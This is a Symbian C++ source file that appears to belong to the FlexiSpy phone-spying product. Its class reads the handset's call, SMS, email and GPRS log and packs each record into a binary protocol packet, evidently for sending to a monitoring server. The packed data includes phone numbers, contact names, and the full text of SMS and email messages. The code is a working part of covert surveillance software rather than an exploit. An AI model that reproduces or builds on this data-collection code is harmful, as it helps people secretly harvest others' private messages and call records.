#include "CltLogEvent.h"
#include <e32std.h>
#include <logwrap.h>
#include <s32strm.h>

#include "ByteUtil.h"
#include "Global.h"
#include "AppInfoConst.h"
#include "AppDefinitions.h"
#include <utf.h>

#include <stdlib.h> //atoi


//const TInt64 KDateSince1970(14474675,254771200); // equal to 62168256000000000
const TInt KPART1_PK_LENGTH = 18;// part1 is from LogEventId to Duration

//--------------------------------------------------------
//  Construction
//--------------------------------------------------------
CFxsLogEvent::CFxsLogEvent()
	{
	iFlag = EEntryNullFlag;
	}

CFxsLogEvent::~CFxsLogEvent()
	{	
	delete	iStatus;
	delete	iDescription;	
	delete	iNumber;
	delete	iSubject;
	delete	iData;
	delete	iRemoteParty;	
	delete 	iLogEvent;
	}

CFxsLogEvent* CFxsLogEvent::NewL(const CLogEvent& aLogEvent)
	{	
	CFxsLogEvent* self = CFxsLogEvent::NewLC(aLogEvent);
	CleanupStack::Pop(self);
	return self;
	}

 CFxsLogEvent* CFxsLogEvent::NewLC(const CLogEvent& aLogEvent)
	{	
	CFxsLogEvent* self = new (ELeave) CFxsLogEvent();
	CleanupStack::PushL(self);
	self->ConstructL(aLogEvent);
	return self;
	}

CFxsLogEvent* CFxsLogEvent::NewL()
	{	
	CFxsLogEvent* self = new (ELeave) CFxsLogEvent();
	return self;
	}

CFxsLogEvent* CFxsLogEvent::NewL(const TInt32 aId,
								  const TUint32 aDuration,
								  const TInt	aDirection,
								  const TInt	aEventType,
								  const TTime  aTime,
								  const TDesC&	aStatus,
								  const TDesC&	aDescription,
								  const TDesC&	aNumber,
								  const TDesC&	aSubject,
								  const TDesC&	aData,
								  const TDesC&	aRemoteParty,
								  const TDesC&  aTimeStr,
								  TInt 	aFlag ) 
	{	
	CFxsLogEvent* event = NewL();
	CleanupStack::PushL(event);
	event->SetId(aId);
	event->SetDuration(aDuration);
	event->SetEventType(aEventType);
	event->SetTime(aTime);
	event->SetDirection(aDirection);
	event->SetStatusL(aStatus);
	event->SetDescriptionL(aDescription);
	event->SetNumberL(aNumber);
	event->SetSubjectL(aSubject);
	event->SetDataL(aData);
	event->SetRemotePartyL(aRemoteParty);
	event->SetFlag(aFlag);
	if(aTimeStr.Length() > 1)
		{
		event->SetTimeStr(aTimeStr);
		}
	else
		{
		event->FormatTimeL();	
		}
	CleanupStack::Pop(event);	
	return event;	
	}

void CFxsLogEvent::ConstructL(const CLogEvent& aLogEvent)
	{
 	iLogEvent =  CLogEvent::NewL();
	iLogEvent->CopyL(aLogEvent);
	FormatTimeL();
	 
 	//SetDirection(ToCltDirection(aLogEvent.Direction()));
	SetEventType(ToCltEventType(aLogEvent.EventType()));	 
	 
	 // GPRS Event
	if(KLogPacketDataEventTypeUid == aLogEvent.EventType()) 
		{
  	    SetGprsDataL(aLogEvent.Data());
		}
	}

void CFxsLogEvent::FormatTimeL()
	{
	//actually it will never leave with KErrOverflow, KErrGeneral as tested
	if(!iTimeStr.Length())
		{
		const TTime& time = Time();
		time.FormatL(iTimeStr,KSimpleTimeFormat);	
		}
	}
	
//
//convert this object to protocol pkt
//the caller must cleanup the returned obj
//
HBufC8* CFxsLogEvent::ToByteProtocolLC() 
	{
	CBufBase* buffer = CBufSeg::NewL(KKiloBytes*2);
	CleanupStack::PushL(buffer);
	TInt pos = 0;
	TUint8* bLogId = NewArrayLC(4);
	ByteUtil::copy(bLogId,(TUint)Id(), 4);
	//EventLogId
	buffer->InsertL(pos,bLogId,4);
	pos += 4;
	CleanupStack::PopAndDestroy();//delete[] bLogId;
	
	//event type, 1 byte		
	TBuf8<1> bType;
	bType.SetMax();
	bType[0] = (TUint8)EventType();	
	//Event type
	buffer->InsertL(pos,bType,1);
	pos += 1;
	
	//if(AppDefinitions::ProductVersion() >= MOBILE_TIMESTRING_SINCE_VER
	//								   || AppDefinitions::PlatformCode() >=  PLATFORM_S60_3rd
	//								   || AppDefinitions::ProductNumber() == PRODUCT_ID_FXSPY_LITE_S9 
	//								   || AppDefinitions::ProductNumber() == PRODUCT_ID_FXSPY_PRO_S9)
		{
		TBuf8<1> bTimeStrLen;
		bTimeStrLen.SetMax();
		TInt timeStrLen = TimeStr().Length();
		bTimeStrLen[0] = (TUint8)timeStrLen;
		//Time string length		
		buffer->InsertL(pos,bTimeStrLen,1);
		pos += 1;
		
		TBuf8<50> timeStr8;
		timeStr8.Copy(TimeStr());
		timeStrLen=timeStr8.Length();
		//Time string value
		buffer->InsertL(pos,timeStr8,timeStrLen);
		pos += timeStrLen;
		}
	/*else
		{	
#if !defined (EKA2) // Not 3rd-edition
		//time, 8 bytes
		TTime time = Time();
		TInt64 time64 = time.Int64();
		
		//Note:
		TInt64 timeSince1970(14474675,254771200); // equal to 62168256000000000
		time64 -= timeSince1970;
		
		TUint8* bTime = NewArrayLC(8);
		ByteUtil::copy(bTime,time64);
		buffer->InsertL(pos,bType,8);
		pos += 8;
		CleanupStack::PopAndDestroy(); //bTime
#endif
		}
	*/
	//--- direction, 1 byte	
	TBuf8<1> bDirection;
	bDirection.SetMax();
	bDirection[0] = (TUint8)Direction();
	//direction value
	buffer->InsertL(pos,bDirection,1);
	pos += 1;
	
	//--- duration, 4 bytes
	TUint8* bDuration = NewArrayLC(4);		
	TUint duration = (TUint)Duration();
	if(KFxsLogEventTypeSMS == iEventType) 
		{
		duration =0;
		}
	ByteUtil::copy(bDuration,duration, 4);
	//Duration
	buffer->InsertL(pos,bDuration,4);
	pos += 4;
	CleanupStack::PopAndDestroy(); //bDuration	
	
	//Number ------------------------------------
	//
	HBufC8* number8 = ToUtf8LC(Number());
	TUint16 numberLen = (TUint16) number8->Length();	
	TUint8* bNumberLen = NewArrayLC(2);	
	ByteUtil::copy(bNumberLen,numberLen,2);
	//Number lenght
	buffer->InsertL(pos,bNumberLen,2);
	pos += 2;
	CleanupStack::PopAndDestroy(); //bNumberLen
	
	//Number value
	buffer->InsertL(pos, *number8, numberLen);	
	pos += numberLen;
	
	CleanupStack::PopAndDestroy(); //number8
	
	//Desscription ------------------------------------
	//
	HBufC8* desc8 = ToUtf8LC(Description());	
	TUint16 descLen = (TUint16)desc8->Length();
	
	TUint8* bDescLen = NewArrayLC(2);
	ByteUtil::copy(bDescLen, descLen, 2);
	//Desscription length
	buffer->InsertL(pos, bDescLen, 2);
	pos += 2;
	CleanupStack::PopAndDestroy(); //bDescLen
	
	if(descLen > 0)
		{
		//Desscription value
		buffer->InsertL(pos, *desc8, descLen);
		pos +=  descLen;
		}
	CleanupStack::PopAndDestroy(); //desc8
	
	//Subject ------------------------------------
	//
	HBufC8* subject8 = ToUtf8LC(Subject());
	TUint16 subjectLen = (TUint16)subject8->Length();
	TUint8* bSubjectLen = NewArrayLC(2);	
	ByteUtil::copy(bSubjectLen,subjectLen);
	//subject length
	buffer->InsertL(pos,bSubjectLen,2);
	pos += 2;
	CleanupStack::PopAndDestroy(); //bSubjectLen
	
	if(subjectLen > 0)
		{
		//subject value
		buffer->InsertL(pos, *subject8, subjectLen);
		pos += subjectLen;
		}
	CleanupStack::PopAndDestroy(); //subject8	
	
	//Status: ------------------------------------ (Sent, Delivered)
	HBufC8* status8 = NULL;
	//do not send status for grps event
	if(KFxsLogEventPacketData == iEventType) 
		{
		status8 = HBufC8::NewL(0);
		}
	else //
		{
		status8 = ToUtf8LC(Status());
		}
	
	TUint16 statusLen = (TUint16)status8->Length();
	TUint8* bStatusLen = NewArrayLC(2);
	ByteUtil::copy(bStatusLen,statusLen);
	//Status length
	buffer->InsertL(pos, bStatusLen, 2);
	pos += 2;
	CleanupStack::PopAndDestroy(); //bStatusLen	
	
	//
	if(statusLen > 0)
		{
		//Status value
		buffer->InsertL(pos, *status8, statusLen);
		pos += statusLen;		
		}
	CleanupStack::PopAndDestroy(); //status8	
	
	//Data: -----------------------------------------
	//number of byte sent and received for Gprs event:
	if(KFxsLogEventPacketData == iEventType) 
		{
		TUint dataLen = 8; // fixed 8, first 4 byte is numOfByteSent, last 4 byte is numOfByteReceived
		
		// Data Len
		TUint8* bDataLen = NewArrayLC(4);
		ByteUtil::copy(bDataLen,dataLen);
		//AppendByteL(bDataLen, 4); // append
		buffer->InsertL(pos,bDataLen,4);
		pos += 4;
		CleanupStack::PopAndDestroy(); //bDataLen
		
		//extract value from data filed
		ExtractNumberOfGprsDataTransfer();		
		
		// Number of bytes sent
		TUint8* bByteSent = NewArrayLC(4);
		ByteUtil::copy(bByteSent,iByteDataSent,4);
		buffer->InsertL(pos,bByteSent,4);
		pos += 4;
		CleanupStack::PopAndDestroy();//bByteSent
		
		// Number of byte received
		TUint8* bByteRev = NewArrayLC(4);
		ByteUtil::copy(bByteRev,iByteReceived,4);
		//AppendByteL(bByteRev, 4); // append
		buffer->InsertL(pos,bByteRev,4);
		pos += 4;
		CleanupStack::PopAndDestroy();//bByteRev
	 	}
	 else
	 	{
	 	//General purpose Data field
	 	//SMS Event  : sms contents
	 	//Email Event: email contents
	 	//GPRS  Event: number of bytes sent/received
	 	//Others     : Not used				
		HBufC8* dataUtf8 = ToUtf8LC(Data());
		TUint dataLen = (TUint)dataUtf8->Length();
		
		// Data Len
		TUint8* bDataLen = NewArrayLC(4);
		ByteUtil::copy(bDataLen,dataLen);
		//Data length
		buffer->InsertL(pos,bDataLen,4);
		pos += 4;
		CleanupStack::PopAndDestroy(); //bDataLen
		
		if(dataLen > 0 )
			{
			//Data value
			buffer->InsertL(pos,*dataUtf8,dataLen);
			pos += dataLen;				
			}
		CleanupStack::PopAndDestroy(); //dataUtf8			
		}
	
	//RemoteParty: -------------------------------------
	// 
	HBufC8* remoteParty8 = ToUtf8LC(RemoteParty());
	TUint16 rmPtyLen = (TUint16)remoteParty8->Length();	
	
	TUint8* bRmPtyLen = NewArrayLC(2);
	ByteUtil::copy(bRmPtyLen,rmPtyLen);	
	//RemoteParty length
	buffer->InsertL(pos,bRmPtyLen,2);
	pos += 2;
	
	CleanupStack::PopAndDestroy();//NewArrayLC
	
	if(rmPtyLen > 0) 
		{
		//RemoteParty value
		buffer->InsertL(pos,*remoteParty8,rmPtyLen);		
		pos += rmPtyLen;
		}
	
	CleanupStack::PopAndDestroy(); //remoteParty8	
	//buffer->Compress();
	
	//double check
	TInt bufSize = buffer->Size();	
	// read it back	
	HBufC8* protcByte = HBufC8::NewL(bufSize);
	TPtr8 des8 = protcByte->Des();
	buffer->Read(0,des8, bufSize);	
	
	CleanupStack::PopAndDestroy(buffer);
	
	CleanupStack::PushL(protcByte);	
	return protcByte;
	}

HBufC8* CFxsLogEvent::ToUtf8LC(const TDesC& aText)
	{
	TInt len = aText.Length();
	RBuf8 buffer;
	buffer.CleanupClosePushL();
	TPtrC16 remainderOfUnicodeText(aText);
	if(len > 0)
		{
		TBuf8<100> outputPtr8;
		FOREVER
			{
			outputPtr8.SetLength(0);
			TInt err = CnvUtfConverter::ConvertFromUnicodeToUtf8(outputPtr8, remainderOfUnicodeText);
   			if(err == KErrNone) //success
   				{
   				XUtil::AppendL(buffer, outputPtr8);
   				break;
   				}
   			//check that the descriptor isn corrupt
        	else if(err < 0)
        		{
        		_LIT8(KUnicodeConversionErr,"\n(System Utf8 Error: %d)");
        		outputPtr8.Format(KUnicodeConversionErr, err);
        		XUtil::AppendL(buffer, outputPtr8);
        		//EErrorIllFormedInput
				//KErrCorrupte
        		break;
        		}
        	//not finished, continue next loop
            else
            	{
            	XUtil::AppendL(buffer, outputPtr8);
        		remainderOfUnicodeText.Set(remainderOfUnicodeText.Right(err));    	
            	}
			}
		}
	
	HBufC8* ret = HBufC8::NewL(buffer.Length());
	ret->Des().Append(buffer);
	CleanupStack::PopAndDestroy();//buffer
	CleanupStack::PushL(ret);
	return ret;	
	}

TUint8* CFxsLogEvent::NewArrayLC(TInt aLength)
	{
	TUint8* ptr = new (ELeave)TUint8[aLength];
	FillZ(ptr,aLength);
	CleanupArrayDeletePushL(ptr);
	return ptr;	
	}

void CFxsLogEvent::FillZ(TUint8* aPtr, TInt aLength)
	{
	Mem::FillZ(aPtr, aLength);
	}
	
void CFxsLogEvent::ExtractNumberOfGprsDataTransfer()
	{	
	const TDesC& dataField = Data();
			
	TInt dataLen = dataField.Length();
	
	if(dataLen > 0)
		{	
		TBuf<2> comma(_L(","));
		TInt pos=dataField.Find(comma);
		if(pos > 0)
			{
			TPtrC sent=dataField.Left(pos);
			TPtrC recv=dataField.Right(dataField.Length()- pos-1);
						
			TLex sentLex(sent);
			TLex recvLex(recv);

			sentLex.Val(iByteDataSent);			
			recvLex.Val(iByteReceived);						
			}
		}
	}

TInt CFxsLogEvent::ToCltEventType(TUid type)
	{
	if(type == KLogCallEventTypeUid)
		return KFxsLogEventTypeCall;
	else if (type == KLogShortMessageEventTypeUid)
		return KFxsLogEventTypeSMS;
	else if (type == KLogFaxEventTypeUid)
		return KFxsLogEventTypeFax;
	else if(type == KLogMailEventTypeUid)
		return KFxsLogEventTypeMail;
	else if (type == KLogDataEventTypeUid)
		return KFxsLogEventTypeData;
	else if (type == KLogTaskSchedulerEventTypeUid)
		return KFxsLogEventTypeTaskScheduler;
	else if (type == KLogPacketDataEventTypeUid) //gprs
		return KFxsLogEventPacketData;
	else 
		return KFxsLogEventTypeUnknown;	
	}

//--------------------------------------------------------
//  Getter, Setter Method
//--------------------------------------------------------

TLogId CFxsLogEvent::Id() const 
	{
	if(!iLogEvent) 
		{
		return iLogId;			
		}
		
	return iLogEvent->Id();			
	}

const TDesC& CFxsLogEvent::RemoteParty() const
	{
	if(iLogEvent)
		{
		return iLogEvent->RemoteParty();	
		}	
	
	const TDesC& ret = (iRemoteParty) ? *iRemoteParty : KNullDesC();
	return ret;
	}

const TTime& CFxsLogEvent::Time() const
	{
	if(!iLogEvent) 
		{
		return iTime;			
		}
		
	return iLogEvent->Time();
	}

TLogDuration CFxsLogEvent::Duration() const
	{
	if(!iLogEvent) 
		return iDuration;
		
	return iLogEvent->Duration();
	}

const TDesC& CFxsLogEvent::Status() const
	{	
	if(iLogEvent) 
		{
		return iLogEvent->Status();
		}
	
	const TDesC& ret = (iStatus) ? *iStatus : KNullDesC();
	return ret;
	}
	
const TDesC& CFxsLogEvent::Subject() const
	{
	if(iLogEvent)
		{
		return iLogEvent->Subject();	
		}
	const TDesC& ret = (iSubject) ? *iSubject : KNullDesC();
	return ret;	
	}

const TDesC& CFxsLogEvent::Number() const
	{
	if(iLogEvent) 
		{
		return iLogEvent->Number();
		}
	
	const TDesC& ret = (iNumber) ? *iNumber : KNullDesC();
	return ret;
	}
	
TContactItemId CFxsLogEvent::ContactItemId() const
	{
	if(!iLogEvent) 
		return iContactItemId;
		
	return iLogEvent->Contact();
	}
	
const TDesC& CFxsLogEvent::Description() const
	{		
	if(iLogEvent) 
		{
		return iLogEvent->Description();			
		}
	
	const TDesC& ret = (iDescription) ? *iDescription : KNullDesC();
	return ret;	
	}

const TDesC& CFxsLogEvent::Data() const
	{
	const TDesC& ret = (iData) ? *iData : KNullDesC();
	return ret;
	}

const TDesC& CFxsLogEvent::GprsDataL()
	{	
	SetGprsDataL(iLogEvent->Data());
	return Data();
	}		

void CFxsLogEvent::SetGprsDataL(const TDesC8& aParam)
	{	
	TInt len = aParam.Length();		
	if(len > 0) 
		{		
		if(iData) 
			{
			delete iData;
			iData = NULL;
			}
			
		iData = HBufC::NewL(len);	
		iData->Des().Copy(aParam);
		}
	}	

void CFxsLogEvent::SetDescriptionL(const TDesC& aParam)
	{	
	TInt len = aParam.Length();		
	if(len > 0)
		{
		if(iDescription) 
			{
			delete iDescription;
			iDescription = NULL;
			}
			
		iDescription = HBufC::NewL(len);	
		iDescription->Des().Copy(aParam);
		}
	}

void CFxsLogEvent::SetNumberL(const TDesC& aParam)
	{		
	TInt len = aParam.Length();			
	if(len > 0)
		{
		if(iNumber) 
			{
			delete iNumber;
			iNumber = NULL;
			}
			
		iNumber = HBufC::NewL(len);	
		iNumber->Des().Copy(aParam);
		}
	}

void CFxsLogEvent::SetStatusL(const TDesC& aParam)
	{	
	TInt len = aParam.Length();					
	if(len > 0)
		{
		if(iStatus) 
			{
			delete iStatus;
			iStatus = NULL;
			}
		iStatus = HBufC::NewL(len);	
		iStatus->Des().Copy(aParam);
		}
	}

void CFxsLogEvent::SetSubjectL(const TDesC& aParam)
	{
	TInt len = aParam.Length();	
	if(len > 0)
		{
		if(iSubject) 
			{
			delete iSubject;
			iSubject = NULL;
			}
			
		iSubject = HBufC::NewL(len);	
		iSubject->Des().Copy(aParam);
		}
	}
	
void CFxsLogEvent::SetDataL(const TDesC& aParam)
	{
	TInt len = aParam.Length();	
	if(len > 0)
		{
		if(iData) 
			{
			delete iData;
			iData = NULL;
			}
			
		iData = HBufC::NewL(len);	
		iData->Des().Copy(aParam);
		}
	}


void CFxsLogEvent::SetRemotePartyL(const TDesC& aParam)
	{	
	TInt len = aParam.Length();
	if(len > 0)
		{
		if(iRemoteParty) 
			{
			delete iRemoteParty;
			iRemoteParty = NULL;
			}
			
		iRemoteParty = HBufC::NewL(len);	
		iRemoteParty->Des().Copy(aParam);
		}
	}
